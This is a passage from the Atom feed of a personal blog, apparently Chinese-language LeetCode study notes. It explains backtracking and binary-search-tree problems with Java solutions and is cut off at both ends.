k)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(targetSum == sum)</span><br><span class="line">            &#123;</span><br><span class="line">                result.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>(path));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//注意不要硬套模板 n-(k-path.size())+1 可能导致越界</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex;i&lt;=<span class="number">9</span>-(k-path.size())+<span class="number">1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            path.add(i);</span><br><span class="line">            sum+=i;</span><br><span class="line">            backtracking(targetSum,k,i+<span class="number">1</span>,sum);</span><br><span class="line">            path.remove(path.size()-<span class="number">1</span>);</span><br><span class="line">            sum-=i;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="电话号码数字组合"><a href="#电话号码数字组合" class="headerlink" title="电话号码数字组合"></a>电话号码数字组合</h4><p>link：<a href="https://leetcode.cn/problems/letter-combinations-of-a-phone-number/description/">17. 电话号码的字母组合 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>首先明确，当对字符串进行修改的时候需要使用<strong>StringBuffer</strong>和<strong>StringBuilder类</strong>.<br>和String类不同的是<strong>上述两者的对象能够多次被修改且不产生新的对象</strong>.<br><strong>StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类.（虽然StringBuilder线程不安全）</strong><br>题目给的是电话号码，数字和字母要对应上，那么自然想到使用Map进行映射存储.<br>特殊的0和1（好奇妙的二进制原来电话也是有设计的！bushi 发上癫了）我们置为空即可.<br>那么此时关键点已经变成了如何在此题中找到我们之前使用的”n”和”k”.<br><img src="/../imgs/2024-10/image-20241125202438310.png" alt="image-20241125202438310"><br>按上图分析我们需要的深度就是传入参数的长度，广度就是固定好的字符个数（也就是3）这俩必要参数确定好之后再来一个记录当前遍历位置的指针即可.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">//存储结果</span></span><br><span class="line">    List&lt;String&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">letterCombinations</span><span class="params">(String digits)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(digits == <span class="literal">null</span> || digits.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">//存储需要的值</span></span><br><span class="line">        String[] numStr = &#123;<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;abc&quot;</span>, <span class="string">&quot;def&quot;</span>, <span class="string">&quot;ghi&quot;</span>, <span class="string">&quot;jkl&quot;</span>, <span class="string">&quot;mno&quot;</span>, <span class="string">&quot;pqrs&quot;</span>, <span class="string">&quot;tuv&quot;</span>, <span class="string">&quot;wxyz&quot;</span>&#125;;</span><br><span class="line">        <span class="comment">//回溯</span></span><br><span class="line">        backtracking(digits,numStr,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//使用效率高的builder</span></span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//str表示当前num对应的字符串</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(String digits,String[] numStr,<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(num == digits.length()) &#123;</span><br><span class="line">            res.add(tmp.toString());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> numStr[digits.charAt(num) - <span class="string">&#x27;0&#x27;</span>];</span><br><span class="line">    <span class="comment">//注意是单独的集合 判断 如&quot;23&quot; 结果是ab</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            tmp.append(str.charAt(i));</span><br><span class="line">            backtracking(digits, numStr, num + <span class="number">1</span>);</span><br><span class="line">            tmp.deleteCharAt(tmp.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong></p><ul><li>res.add(sb.toString());&#96; 用于将当前构建的字母组合添加到结果列表中。</li><li><code>tmp.append(str.charAt(i));</code> 用于将当前字符添加到 <code>tmp</code> 中，以构建当前的字母组合。</li><li><code>String str = numString[digits.charAt(num) - &#39;0&#39;];</code> 用于将输入字符串中的字符转换为对应的数字，并获取该数字对应的字母字符串。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;组合总和III&quot;&gt;&lt;a href=&quot;#组合总和III&quot; class=&quot;headerlink&quot; title=&quot;组合总和III&quot;&gt;&lt;/a&gt;组合总和III&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/combina</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x17</title>
    <link href="https://yubut.github.io/2024/11/21/yub%E3%81%AEAlgorithm.0x17/"/>
    <id>https://yubut.github.io/2024/11/21/yub%E3%81%AEAlgorithm.0x17/</id>
    <published>2024-11-21T03:05:18.000Z</published>
    <updated>2024-11-25T09:44:21.256Z</updated>
    
    <content type="html"><![CDATA[<h4 id="初探回溯"><a href="#初探回溯" class="headerlink" title="初探回溯"></a>初探回溯</h4><h5 id="什么是回溯算法"><a href="#什么是回溯算法" class="headerlink" title="什么是回溯算法"></a>什么是回溯算法</h5><p>回溯算法是一种暴力<strong>穷举</strong>的<strong>搜索方式</strong>.<br>回溯和递归是相辅相承的**.(有递归就会有回溯)**</p><h5 id="回溯法解决的问题"><a href="#回溯法解决的问题" class="headerlink" title="回溯法解决的问题"></a>回溯法解决的问题</h5><ul><li>组合问题：N个数里面按一定规则找出k个数的集合.</li><li>切割问题：一个字符串按一定规则有几种切割方式.</li><li>子集问题：一个N个数的集合里有多少符合条件的子集.</li><li>排列问题：N个数按一定规则全排列，有几种排列方式.</li><li>棋盘问题：N皇后，解数独等.</li></ul><h5 id="使用回溯算法解决问题的思路"><a href="#使用回溯算法解决问题的思路" class="headerlink" title="使用回溯算法解决问题的思路"></a>使用回溯算法解决问题的思路</h5><p>虽然回溯算法暴力效率低下理解起来更为抽象，但好在天无绝人之路，<strong>回溯算法</strong>的问题都可以用<strong>树形结构</strong>来进行理解.</p><hr><p>关键有以下两点：<br><strong>1.集合大小-&gt;树的宽度</strong><br><strong>2.递归深度-&gt;树的深度</strong><br><img src="/../imgs/2024-10/image-20241121153238086.png" alt="image-20241121153238086"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void backtracking(参数) &#123;</span><br><span class="line">    if (终止条件) &#123;</span><br><span class="line">        存放结果;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (选择：本层集合中元素（树中节点孩子的数量就是集合的大小）) &#123;</span><br><span class="line">        处理节点;</span><br><span class="line">        backtracking(路径，选择列表); // 递归</span><br><span class="line">        回溯，撤销处理结果</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="组合问题"><a href="#组合问题" class="headerlink" title="组合问题"></a>组合问题</h4><p>link：<a href="https://leetcode.cn/problems/combinations/description/">77. 组合 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>进入到回溯算法的学习！</p><p>首先明确是在求组合，<strong>组合中的元素是不能重复的</strong>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt;  result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combine</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        backtracking(n,k,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k,<span class="type">int</span> startIndex)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//终止条件</span></span><br><span class="line">        <span class="keyword">if</span>(path.size() == k)</span><br><span class="line">        &#123;</span><br><span class="line">            result.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//for循环</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            path.add(i);</span><br><span class="line">            backtracking(n,k,i+<span class="number">1</span>);</span><br><span class="line">            path.remove(path.size()-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优化思路</strong><br>当我们n&#x3D;k时，第一层for循环再往后遍历就没有意义了.（因为我们最终要取的数的数量要满足，从第二层开始往后的for循环其实已经自动减少了集合中的子集数量，显然这是不符合预期的）<br>以下引用<strong>代码随想录</strong>分析图<br><img src="/../imgs/2024-10/image-20241121150939192.png" alt="image-20241121150939192"></p><p><strong>优化部分</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>已经选择的元素个数：path.size();</span><br><span class="line"><span class="number">2.</span>还需要的元素个数为: k - path.size();</span><br><span class="line"><span class="number">3.</span>在集合n中至多要从该起始位置 : n - (k - path.size()) + <span class="number">1</span>，开始遍历</span><br></pre></td></tr></table></figure><p><strong>优化之后的for循环代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt;= n - (k - path.size()) + <span class="number">1</span>; i++)</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt;  result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combine</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        backtracking(n,k,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k,<span class="type">int</span> startIndex)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//终止条件</span></span><br><span class="line">        <span class="keyword">if</span>(path.size() == k)</span><br><span class="line">        &#123;</span><br><span class="line">         <span class="comment">//new ArrayList(path)，创建了 path 的一个副本</span></span><br><span class="line">   <span class="comment">//这意味着即使后续对 path 的修改也不会影响到 result 中已经保存的组合</span></span><br><span class="line">            result.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//for循环</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex;i &lt;= n - (k - path.size()) + <span class="number">1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            path.add(i);</span><br><span class="line">            backtracking(n,k,i+<span class="number">1</span>);</span><br><span class="line">            path.removeLast();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;初探回溯&quot;&gt;&lt;a href=&quot;#初探回溯&quot; class=&quot;headerlink&quot; title=&quot;初探回溯&quot;&gt;&lt;/a&gt;初探回溯&lt;/h4&gt;&lt;h5 id=&quot;什么是回溯算法&quot;&gt;&lt;a href=&quot;#什么是回溯算法&quot; class=&quot;headerlink&quot; title=&quot;什么是</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x16</title>
    <link href="https://yubut.github.io/2024/11/20/yub%E3%81%AEAlgorithm.0x16/"/>
    <id>https://yubut.github.io/2024/11/20/yub%E3%81%AEAlgorithm.0x16/</id>
    <published>2024-11-20T08:10:25.000Z</published>
    <updated>2024-11-20T11:12:38.942Z</updated>
    
    <content type="html"><![CDATA[<h4 id="修建二叉搜索树"><a href="#修建二叉搜索树" class="headerlink" title="修建二叉搜索树"></a>修建二叉搜索树</h4><p>link：<a href="https://leetcode.cn/problems/trim-a-binary-search-tree/description/">669. 修剪二叉搜索树 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>注意修剪的时候要考虑到全部的节点，即搜到到限定区间小于左值或者大于右值时还需要检查当前不符合区间大小节点的右子树&#x2F;左子树，不能直接返回null.<br>剪去节点只需要在判断当前节点左&#x2F;右子树后将root的左&#x2F;右节点更新即可.<br><img src="/../imgs/2024-10/image-20241120163837657.png" alt="image-20241120163837657"></p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">trimBST</span><span class="params">(TreeNode root, <span class="type">int</span> low, <span class="type">int</span> high)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.val &lt; low) &#123;</span><br><span class="line">            <span class="keyword">return</span> trimBST(root.right,low,high);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.val &gt; high) &#123;</span><br><span class="line">            <span class="keyword">return</span> trimBST(root.left,low,high);</span><br><span class="line">        &#125;</span><br><span class="line">        root.left = trimBST(root.left,low,high);</span><br><span class="line">        root.right = trimBST(root.right,low,high);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="将有序数组转化为平衡二叉树"><a href="#将有序数组转化为平衡二叉树" class="headerlink" title="将有序数组转化为平衡二叉树"></a>将有序数组转化为平衡二叉树</h4><p>link：<a href="https://leetcode.cn/problems/convert-sorted-array-to-binary-search-tree/description/">108. 将有序数组转换为二叉搜索树 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>给了升序数组其实一开始想的也是第一个参数是左子树最左边的值，然后去选中间节点做切割.<br>具体就需要怎么在偶数和奇数参数个数下都适配，其实偶数情况无非是选取中间的两个数（left + (right - left) &#x2F; 2）.</p><p>题目给的输入输出示例其实也已经帮我们提供了两种思路.<br><img src="/../imgs/2024-10/image-20241120170337011.png" alt="image-20241120170337011"></p><h6 id="递归-双指针"><a href="#递归-双指针" class="headerlink" title="递归+双指针"></a>递归+双指针</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//采用左闭右闭区间</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">sortedArrayToBST</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> sort(nums,<span class="number">0</span>,nums.length - <span class="number">1</span>);  </span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode <span class="title function_">sort</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(left &gt; right) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + ((right - left) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(nums[mid]);</span><br><span class="line">        root.left = sort(nums,left,mid - <span class="number">1</span>);</span><br><span class="line">        root.right = sort(nums,mid + <span class="number">1</span>,right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="把二叉搜索树转换为累加树"><a href="#把二叉搜索树转换为累加树" class="headerlink" title="把二叉搜索树转换为累加树"></a>把二叉搜索树转换为累加树</h4><p>link：<a href="https://leetcode.cn/problems/convert-bst-to-greater-tree/description/">538. 把二叉搜索树转换为累加树 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>第一遍看题目还有点没看明白（挠头.jpg<br>其实就是对于树中的每个节点，计算它的值加上树中所有大于该节点值的节点的值.但是保证搜索二叉树的定义，那就是左子树的节点值必须小于节点的值，右子树的节点值必须大于节点的值.那我们就从右子树入手，<strong>反向中序遍历（右根左)<strong>，</strong>确保累加时考虑了所有大于当前节点的值.</strong><br>和上一题相同的思路.</p><h6 id="递归-双指针-1"><a href="#递归-双指针-1" class="headerlink" title="递归+双指针"></a>递归+双指针</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">convertBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        travsal(root);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">travsal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">// 如果当前节点为空，直接返回</span></span><br><span class="line">    &#125;</span><br><span class="line">    travsal(root.right);  <span class="comment">// 先遍历右子树</span></span><br><span class="line">    root.val += pre;      <span class="comment">// 将当前节点的值加上pre</span></span><br><span class="line">    pre = root.val;       <span class="comment">// 更新pre为当前节点的新值</span></span><br><span class="line">    travsal(root.left);   <span class="comment">// 再遍历左子树</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;修建二叉搜索树&quot;&gt;&lt;a href=&quot;#修建二叉搜索树&quot; class=&quot;headerlink&quot; title=&quot;修建二叉搜索树&quot;&gt;&lt;/a&gt;修建二叉搜索树&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/trim-a-</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x15.</title>
    <link href="https://yubut.github.io/2024/11/18/yub%E3%81%AEAlgorithm.0x15/"/>
    <id>https://yubut.github.io/2024/11/18/yub%E3%81%AEAlgorithm.0x15/</id>
    <published>2024-11-18T02:04:14.000Z</published>
    <updated>2024-11-18T06:12:00.638Z</updated>
    
    <content type="html"><![CDATA[<h4 id="二叉搜索树的最近公共祖先"><a href="#二叉搜索树的最近公共祖先" class="headerlink" title="二叉搜索树的最近公共祖先"></a>二叉搜索树的最近公共祖先</h4><p>link：<a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-search-tree/">235. 二叉搜索树的最近公共祖先 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>题目给出的是二叉搜索树，那就方便很多.（<strong>不用在意遍历顺序</strong>）<br>已知左子树的值都比根节点小，右子树的值都比根节点大（每层都符合该规律）但是由于不知道p、q的值哪个比根节点大所以需要进行比较.<br>我们在递归的时候只需要不断缩小判断区间即可.<br>怎么缩小呢？<br>和p、q的值进行比较即可.</p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 